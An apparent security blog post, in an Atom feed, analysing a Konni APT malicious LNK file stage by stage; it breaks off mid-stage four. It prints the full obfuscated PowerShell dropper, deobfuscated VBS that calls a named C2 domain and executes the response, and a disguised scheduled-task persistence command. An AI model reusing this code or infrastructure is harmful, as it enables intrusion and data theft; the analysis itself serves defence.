@@ -1,0 +1,533 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-01-26T23:21:00+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Security Blogs</title><subtitle>A website with blog posts and pages</subtitle><entry><title type="html">Konni [ North Korea-linked APT group ] LNK Analysis</title><link href="http://localhost:4000/2024/01/26/Konni-APT-LNK-Analysis.html" rel="alternate" type="text/html" title="Konni [ North Korea-linked APT group ] LNK Analysis" /><published>2024-01-26T00:00:00+05:30</published><updated>2024-01-26T00:00:00+05:30</updated><id>http://localhost:4000/2024/01/26/Konni%20APT%20LNK%20Analysis</id><content type="html" xml:base="http://localhost:4000/2024/01/26/Konni-APT-LNK-Analysis.html"><![CDATA[<p>This blog will cover the technical analysis of Konni malware family malicious Lnk file. But before starting the analysis I know you are asking a question what/who is konni ?</p>
+
+<blockquote>
+  <p>[!NOTE] : I’m not an expert, but I’m keen on improvement. If you spot any mistakes in my blog, please DM me on any platform you like for constructive feedback.</p>
+</blockquote>
+
+<h1 id="whatwho-is-konni-">What/who is Konni ?</h1>
+<p>The Konni malware family is indeed associated with the APT37 (also known as Reaper or Group123) cyber espionage group. APT37 is believed to be a state-sponsored hacking group based in North Korea. APT37 has been known to target organizations primarily in South Korea, especially those in the political and military sectors. The group has also been linked to campaigns against entities in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. APT37 has employed a variety of tools and techniques in its operations, including custom malware such as the Konni RAT, data exfiltration tools, and spear-phishing campaigns.</p>
+
+<h2 id="infection-chain">Infection chain</h2>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126214209.png" alt="" /></p>
+
+<h2 id="stage-1">Stage 1</h2>
+<p>We have a lnk, this looks like a normal lnk file and it targets to the cmd.exe binary in the syswow64 directory.</p>
+
+<p>Result of ExifTool</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126112721.png" alt="" /></p>
+
+<p>As we can see in the below image the Target is set to the cmd.exe Therefore it will start the cmd.exe from the syswow64.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126112836.png" alt="" /></p>
+
+<p>The Size of the LNK file is something suspicious, The size of this LNK file is 24935KB [ ~25 MB ]. There are lot of space after the cmd.exe it means there is lot more content added after that.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126112948.png" alt="" /></p>
+
+<p>The best way to check is put the LNK file in any Hex Editor, I used HXD to check the file hex and ASCII. After scrolling down little bit at offset B60, we found that there are lot more commands like set, call etc.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126113141.png" alt="" /></p>
+
+<p>This is the complete script found in the LNK file. Let’s discuss what actually this script will execute.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126113345.png" alt="" /></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="nx">q</span> <span class="o">/</span><span class="nx">c</span> <span class="nb">Set</span> <span class="nx">K</span><span class="o">=</span><span class="nx">JkaqBnPUKuftX6iVHIRSTYDLMpAgWsde3Fczm2r8jl1vG0b4hoNZ9yOQ5wExC7</span> <span class="o">&amp;&amp;</span> <span class="nx">call</span> <span class="o">%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">25</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">49</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">57</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">38</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">29</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">48</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">41</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">41</span><span class="p">,</span><span class="mi">1</span><span class="o">%</span> <span class="o">-%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">57</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">30</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">49</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">57</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">29</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">11</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">53</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">41</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%</span> <span class="o">%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">48</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">30</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">30</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="nx">K</span><span class="p">:</span><span class="o">~</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="o">%</span> <span class="dl">"</span><span class="s2">$Bj3hw23s4llgyv = Get-Location;$tywwh842L = Get-ChildItem -Path $Bj3hw23s4llgyv -Recurse *.lnk | where-object {$_.length -eq 0x01859999} | Select-Object -ExpandProperty FullName;if($tywwh842L.length -eq 0) {$Bj3hw23s4llgyv = $env:Temp;$tywwh842L = Get-ChildItem -Path $Bj3hw23s4llgyv -Recurse *.lnk | where-object {$_.length -eq 0x01859999} | Select-Object -ExpandProperty FullName;};$Bj3hw23s4llgyv = Split-Path $tywwh842L;$hl0xA4j = New-Object System.IO.FileStream($tywwh842L, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read);$hl0xA4j.Seek(0x00001A6E, [System.IO.SeekOrigin]::Begin);$nBmFkheUsdoQ = New-Object byte[] 0x0014DEBF;$hl0xA4j.Read($nBmFkheUsdoQ, 0, 0x0014DEBF);$UVJuXNSbxZC4L = $Bj3hw23s4llgyv + '</span><span class="se">\</span><span class="s2">' + [regex]::unescape('[
+).hwp');sc $UVJuXNSbxZC4L $nBmFkheUsdoQ -Encoding Byte;&amp; $UVJuXNSbxZC4L;$hl0xA4j.Seek(0x0014F92D, [System.IO.SeekOrigin]::Begin);$ZS7EsGY5=New-Object byte[] 0x000018A7;$hl0xA4j.Read($ZS7EsGY5, 0, 0x000018A7);$hl0xA4j.Close();Remove-Item -Path $tywwh842L -Force;$x2vuZ_FNChxBs=$env:public + '</span><span class="se">\</span><span class="s2">Libraries</span><span class="se">\</span><span class="s2">vc98ee3f0.vbs';sc $x2vuZ_FNChxBs $ZS7EsGY5 -Encoding Byte;&amp; wscript.exe $x2vuZ_FNChxBs;</span><span class="dl">"</span>
+</code></pre></div></div>
+
+<h3 id="understanding-initial-script">Understanding Initial Script</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set</span> <span class="n">K</span><span class="o">=</span><span class="n">JkaqBnPUKuftX6iVHIRSTYDLMpAgWsde3Fczm2r8jl1vG0b4hoNZ9yOQ5wExC7</span> <span class="o">&amp;&amp;</span> <span class="n">call</span> <span class="o">%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">25</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">49</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">57</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">38</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">29</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">48</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">41</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">41</span><span class="p">,</span><span class="mi">1</span><span class="o">%</span> <span class="o">-%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">57</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">30</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">49</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">57</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">29</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">11</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">53</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">41</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%</span> <span class="o">%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">48</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">30</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">30</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">K</span><span class="p">:</span><span class="o">~</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="o">%</span>
+</code></pre></div></div>
+
+<p>This is something interesting, first a variable is set and then there is a call command with some random commands. Let’s explore what exactly this means by an example.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set</span> <span class="n">Var</span><span class="o">=</span><span class="n">abcdefghijklmn</span>
+<span class="n">echo</span> <span class="o">%</span><span class="n">Var</span><span class="p">:</span><span class="o">~</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">Var</span><span class="p">:</span><span class="o">~</span><span class="mi">13</span><span class="p">,</span><span class="mi">1</span><span class="o">%%</span><span class="n">Var</span><span class="p">:</span><span class="o">~</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="o">%</span>
+</code></pre></div></div>
+
+<p>The Output of this will be cmd, so it means %Var:~3 start substring from the index 3 [ index starts from 0 ] and 1% means take only one char.</p>
+
+<p>Similarly the output of malware will be <strong>powershell -windowstyle hidden</strong></p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126162400.png" alt="" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="n">Bj3hw23s4llgyv</span> <span class="o">=</span> <span class="n">Get</span><span class="o">-</span><span class="n">Location</span><span class="p">;</span>
+<span class="err">$</span><span class="n">tywwh842L</span> <span class="o">=</span> <span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">Path</span> <span class="err">$</span><span class="n">Bj3hw23s4llgyv</span> <span class="o">-</span><span class="n">Recurse</span> <span class="o">*</span><span class="p">.</span><span class="n">lnk</span> <span class="o">|</span> <span class="n">where</span><span class="o">-</span><span class="nb">object</span> <span class="p">{</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span><span class="n">eq</span> <span class="mh">0x01859999</span><span class="p">}</span> <span class="o">|</span> <span class="n">Select</span><span class="o">-</span><span class="n">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">FullName</span>
+</code></pre></div></div>
+
+<p>The PowerShell then execute script and get the current location from where the command is executed and then checks for the Files with extensions <strong>LNK</strong> and compares the size and if any file matches these two condition then name is stored in the variable.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="n">Bj3hw23s4llgyv</span> <span class="o">=</span> <span class="n">Split</span><span class="o">-</span><span class="n">Path</span> <span class="err">$</span><span class="n">tywwh842L</span><span class="p">;</span>
+<span class="err">$</span><span class="n">hl0xA4j</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="nc">FileStream</span><span class="p">(</span><span class="err">$</span><span class="n">tywwh842L</span><span class="p">,</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileMode</span><span class="p">]::</span><span class="n">Open</span><span class="p">,</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileAccess</span><span class="p">]::</span><span class="n">Read</span><span class="p">);</span>
+<span class="err">$</span><span class="n">hl0xA4j</span><span class="p">.</span><span class="nc">Seek</span><span class="p">(</span><span class="mh">0x00001A6E</span><span class="p">,</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">SeekOrigin</span><span class="p">]::</span><span class="n">Begin</span><span class="p">);</span>
+<span class="err">$</span><span class="n">nBmFkheUsdoQ</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="mh">0x0014DEBF</span><span class="p">;</span>
+<span class="err">$</span><span class="n">hl0xA4j</span><span class="p">.</span><span class="nc">Read</span><span class="p">(</span><span class="err">$</span><span class="n">nBmFkheUsdoQ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0014DEBF</span><span class="p">);</span>
+<span class="err">$</span><span class="n">UVJuXNSbxZC4L</span> <span class="o">=</span> <span class="err">$</span><span class="n">Bj3hw23s4llgyv</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\'</span><span class="s"> + [regex]::unescape(</span><span class="sh">'</span><span class="p">[</span>
+<span class="p">).</span><span class="n">hwp</span><span class="sh">'</span><span class="s">);
+sc $UVJuXNSbxZC4L $nBmFkheUsdoQ -Encoding Byte;
+</span></code></pre></div></div>
+
+<p>The file will be opened in read mode and then the seek [ pointer from where to start reading ] is changed to the 0x00001A6E and read for the size 0x0014DEBF. The start is for the Document file and save the file to the current directory [ sc is not the command to configure services, here it is alias for the Set-Content ]. The Filename have character which are in non printable chars range therefore strings did not print the chars in regex unespace [ check below image ]. The doc file is discussed in the section  <a href="#Fake%20Document">Fake Document</a> section</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126164456.png" alt="" /></p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126153701.png" alt="" /></p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126153748.png" alt="" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="n">hl0xA4j</span><span class="p">.</span><span class="nc">Seek</span><span class="p">(</span><span class="mh">0x0014F92D</span><span class="p">,</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">SeekOrigin</span><span class="p">]::</span><span class="n">Begin</span><span class="p">);</span>
+<span class="err">$</span><span class="n">ZS7EsGY5</span><span class="o">=</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="mh">0x000018A7</span><span class="p">;</span>
+<span class="err">$</span><span class="n">hl0xA4j</span><span class="p">.</span><span class="nc">Read</span><span class="p">(</span><span class="err">$</span><span class="n">ZS7EsGY5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x000018A7</span><span class="p">);</span>
+<span class="err">$</span><span class="n">hl0xA4j</span><span class="p">.</span><span class="nc">Close</span><span class="p">();</span>
+<span class="n">Remove</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="n">Path</span> <span class="err">$</span><span class="n">tywwh842L</span> <span class="o">-</span><span class="n">Force</span><span class="p">;</span>
+<span class="err">$</span><span class="n">x2vuZ_FNChxBs</span><span class="o">=</span><span class="err">$</span><span class="n">env</span><span class="p">:</span><span class="n">public</span> <span class="o">+</span> <span class="sh">'</span><span class="s">\Libraries</span><span class="se">\v</span><span class="s">c98ee3f0.vbs</span><span class="sh">'</span><span class="p">;</span>
+<span class="n">sc</span> <span class="err">$</span><span class="n">x2vuZ_FNChxBs</span> <span class="err">$</span><span class="n">ZS7EsGY5</span> <span class="o">-</span><span class="n">Encoding</span> <span class="n">Byte</span><span class="p">;</span>
+<span class="o">&amp;</span> <span class="n">wscript</span><span class="p">.</span><span class="n">exe</span> <span class="err">$</span><span class="n">x2vuZ_FNChxBs</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Then the seek pointer again changed to the start of the offset 0x0014F92D, which is the end of the 
+document file and then it read  for the size 0x000018A7. This is the VBS code as shown in below image. The malware remove the LNK file and save the  vbs code to the location $env:public\Libraries\vc98ee3f0.vbs. <strong>wscript.exe</strong> is used to execute the script.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126165658.png" alt="" /></p>
+
+<p>There are multiple ways to get the vbs code, using strings, execute the LNK then suspend the PowerShell process, collect the vbs from memory. But I am smart [ just joking ] I just changed the wscript.exe to notepad.exe using the hxd and then execute and you will find that notepad is opened and have our clean vbs code without any effort.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126113521.png" alt="" />
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126113820.png" alt="" /></p>
+
+<h3 id="fake-document">Fake Document</h3>
+<p>The document dropped in the stage 1 is just to fool the user that actual file is opening using the lnk file and behind that  vbs will be executed.</p>
+
+<p>The File is not dumped to the disk properly so I carved from the lnk file manually and when unzipping the file, we have the below directory structure.
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126211503.png" alt="" /></p>
+
+<p>The script folder have two scripts but both are clean, no malicious code found in them.
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126211755.png" alt="" /></p>
+
+<h5 id="sourcescriptsjs">sourceScripts.js</h5>
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126211614.png" alt="" /></p>
+
+<h5 id="headerscriptsjs">headerScripts.js</h5>
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126211644.png" alt="" /></p>
+
+<p>This is the png file present in the preview directory
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126211847.png" alt="" /></p>
+
+<p>Output of the olevba and oleid to find if there is any external ole objects or relationships are there and VBA are present or not.
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126212005.png" alt="" /></p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126212025.png" alt="" /></p>
+<h2 id="stage-2">Stage 2</h2>
+
+<p>The vbs dropped in Public User Library is obfuscated as you can check in below image.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126180046.png" alt="" /></p>
+
+<h3 id="deobfuscating-vbs">Deobfuscating VBS</h3>
+
+<p>There is a pattern :</p>
+<ul>
+  <li>First there will be a variable which is Initialize with random characters</li>
+  <li>Second variable whose value is created by xor operation and then concatenation
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">:</code> is used so that multiple instruction can be performed in single line</li>
+    </ul>
+  </li>
+  <li>The second variable final value is assigned to the First variable and same follows for all</li>
+</ul>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126114013.png" alt="" /></p>
+
+<p>Other than these instructions, there are few lines in code which stands out as shown in below image.</p>
+
+<ul>
+  <li>Object is created and ComputerName is collected and assigned to variable</li>
+  <li>Some possible http request are send and response is executed</li>
+</ul>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126114134.png" alt="" /></p>
+
+<p>Now I have two options either to deobfuscate the code manually or I can use my python skill to save the time. So initially I thought why waste time on building a script. But after spending time on find &amp; replace and executing, I thought let’s write a script.</p>
+
+<p>I have written a script on the basis of the pattern identified above. This script will help you to find the final value of all the variables [ I know this is not the ultimate script but atleast it reduces time which we waste on find &amp; replace, xor etc.. ]</p>
+
+<p>Script Link : <a href="https://gist.github.com/SatyenderYadav/de46604ddc5803ca1e8681a1fc9217ab">Konni Deobfuscation.py</a></p>
+
+<p>Output of the script for the obfuscated vbs. From the output we can easily make a assumption that there is a URL and keywords like XMLHTTP, WScript.Network, it means malware was communicating to a URL for further instruction.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126114400.png" alt="" /></p>
+
+<p>After replacing the value of variable from the output of above script this can be observed that a GET request will be sent to a URL and the response of the GET request will then further executed.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MStMJGQFU2WWvL</span> <span class="o">=</span> <span class="n">otc1lnmclX_fD1</span>
+<span class="n">Set</span> <span class="n">mjmVH</span> <span class="o">=</span> <span class="nc">CreateObject</span><span class="p">(</span><span class="n">MStMJGQFU2WWvL</span><span class="p">)</span>
+<span class="n">V3wedMG4f</span> <span class="o">=</span> <span class="nc">CreateObject</span><span class="p">(</span><span class="n">WROQ_YD</span><span class="p">).</span><span class="n">ComputerName</span>
+<span class="n">xwF7q0noUVrR6V</span> <span class="o">=</span> <span class="n">S1DZTGpId3W32</span>
+<span class="n">MWeRawXu7im</span> <span class="o">=</span> <span class="n">S1DZTGpId3W31</span>
+<span class="n">mjmVH</span><span class="p">.</span><span class="nb">open</span> <span class="n">MWeRawXu7im</span><span class="p">,</span> <span class="n">xwF7q0noUVrR6V</span> <span class="o">&amp;</span> <span class="n">V3wedMG4f</span><span class="p">,</span> <span class="bp">False</span>
+<span class="n">mjmVH</span><span class="p">.</span><span class="n">Send</span>
+<span class="nc">Execute</span><span class="p">(</span><span class="n">mjmVH</span><span class="p">.</span><span class="n">responseText</span><span class="p">)</span>
+
+<span class="o">//</span> <span class="n">Final</span> <span class="n">Command</span><span class="p">:</span> 
+<span class="n">Microsoft</span><span class="p">.</span><span class="n">XMLHTTP_Object</span><span class="p">.</span><span class="nb">open</span> <span class="n">GET</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">shaira1885</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">includes</span><span class="o">/</span><span class="n">class</span><span class="o">-</span><span class="n">wp</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">data</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">class</span><span class="o">=</span> <span class="o">&amp;</span> <span class="n">ComputerName</span><span class="p">,</span> <span class="bp">False</span>
+<span class="n">Microsoft</span><span class="p">.</span><span class="n">XMLHTTP_Object</span><span class="p">.</span><span class="n">send</span>
+<span class="nc">Execute</span><span class="p">(</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">XMLHTTP_Object</span><span class="p">.</span><span class="n">responseText</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="stage-3">Stage 3</h2>
+
+<p>During the analysis the url was active and when sending the request to the url with any computername we receive the output. The output looks similar to the vbs code we deobfuscated in the above stage.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126115250.png" alt="" /></p>
+
+<p>I used the same python script created in earlier stage and it worked in this case also and this time the output shows some new keywords like schtasks, WScript.Shell.
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126115414.png" alt="" /></p>
+
+<p>Similar to stage 1, after replacing the variables value with the output of the script we found that this time a schedule task will be created and name of the task will be <strong>WeChatVersionAutoUpdate</strong>, frequency is every 10 mins and the file is the vbs present in our Public User Directory .</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">WVYizmUVLdRpNux</span> <span class="o">=</span> <span class="n">m0ZsX6BmI5E</span> <span class="o">&amp;</span> <span class="nc">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">zC6JdUI0Tsi</span> <span class="o">&amp;</span> <span class="nc">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">h1ub38dv</span> <span class="o">&amp;</span> <span class="nc">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">WScript</span><span class="p">.</span><span class="n">ScriptFullName</span> <span class="o">&amp;</span> <span class="nc">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">R52bXZrrdxrm</span> 
+<span class="n">pqMHgeKOpmHHh</span><span class="p">.</span><span class="n">Run</span> <span class="n">WVYizmUVLdRpNux</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="bp">False</span>
+
+<span class="n">WVYizmUVLdRpNux</span> <span class="o">=</span> <span class="n">schtasks</span> <span class="o">/</span><span class="n">create</span> <span class="o">/</span><span class="n">sc</span> <span class="n">minute</span> <span class="o">/</span><span class="n">mo</span> <span class="mi">10</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&amp;</span> <span class="sh">"</span><span class="s"> &amp; WeChatVersionAutoUpdate &amp; </span><span class="sh">"</span> <span class="o">&amp;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&amp;</span> <span class="sh">"</span><span class="s"> &amp; WScript.ScriptFullName &amp; </span><span class="sh">"</span> <span class="o">&amp;</span> <span class="o">/</span><span class="n">f</span>
+<span class="n">Wscript</span><span class="p">.</span><span class="n">Shell</span><span class="p">.</span><span class="n">Run</span> <span class="n">WVYizmUVLdRpNux</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="bp">False</span>
+</code></pre></div></div>
+
+<p>I was thinking that what will be the use of downloading the same vbs again and again and then creating the same schedule task again. But as I always say in security don’t assume anything, I revisited the site and refreshed the page but this time the vbs code changed. This means when you first visit the URL with unique computername it will send you the vbs code to create the schedule task but after that it will ask return the another vbs which we will checking in stage4.</p>
+<h2 id="stage-4">Stage 4</h2>
+
+<p>As explained above we recevied the new code this time and the same obfuscation is used here also.</p>
+
+<p><img src="/assets/img/Konni_Mal/Pasted%20image%2020240126120015.png" alt="" /></p>
+
+<p>Using the script to deobfuscate the vbs code and checking the output. But this time it is very interesting this time we don’t have GET method we have POST method.</p>
+
+<p>Malware now send information to the same domain but the endpoint is changed.
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126120106.png" alt="" /></p>
+
+<p>From the below image we can find that there are dir command used on multiple directory like Downloads, Documents, Users etc and stored in different files
